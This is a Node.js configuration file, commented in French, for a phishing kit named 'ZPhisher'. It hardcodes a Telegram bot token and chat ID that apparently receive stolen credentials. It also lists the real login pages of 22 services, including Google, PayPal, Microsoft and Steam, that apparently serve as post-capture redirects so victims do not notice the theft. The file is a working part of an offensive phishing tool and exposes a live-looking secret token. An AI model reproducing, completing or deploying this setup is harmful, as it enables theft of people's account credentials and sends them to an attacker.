// Configuration ZPhisher Node.js
module.exports = {
    // Configuration du serveur
    PORT: process.env.PORT || 3000,
    NODE_ENV: process.env.NODE_ENV || 'development',
    
    // Configuration Telegram Bot
    TELEGRAM_BOT_TOKEN: process.env.TELEGRAM_BOT_TOKEN || "8418218975:AAHqp0Y1vQctQDfWQWuezLEpnmzB-UVB3MQ",
    TELEGRAM_CHAT_ID: process.env.TELEGRAM_CHAT_ID || "-1003002461673",
    
    // URLs de redirection par défaut
    REDIRECT_URLS: {
        'steam': 'https://store.steampowered.com/login/',
        'facebook': 'https://www.facebook.com/login/',
        'google': 'https://accounts.google.com/signin',
        'instagram': 'https://www.instagram.com/accounts/login/',
        'twitter': 'https://twitter.com/login',
        'discord': 'https://discord.com/login',
        'netflix': 'https://www.netflix.com/login',
        'paypal': 'https://www.paypal.com/signin',
        'github': 'https://github.com/login',
        'linkedin': 'https://www.linkedin.com/login',
        'microsoft': 'https://login.microsoftonline.com/',
        'adobe': 'https://account.adobe.com/',
        'dropbox': 'https://www.dropbox.com/login',
        'ebay': 'https://signin.ebay.com/',
        'snapchat': 'https://accounts.snapchat.com/accounts/login',
        'spotify': 'https://accounts.spotify.com/login',
        'twitch': 'https://www.twitch.tv/login',
        'vk': 'https://vk.com/login',
        'wordpress': 'https://wordpress.com/log-in',
        'xbox': 'https://login.live.com/',
        'yahoo': 'https://login.yahoo.com/',
        'yandex': 'https://passport.yandex.com/auth'
    }
};
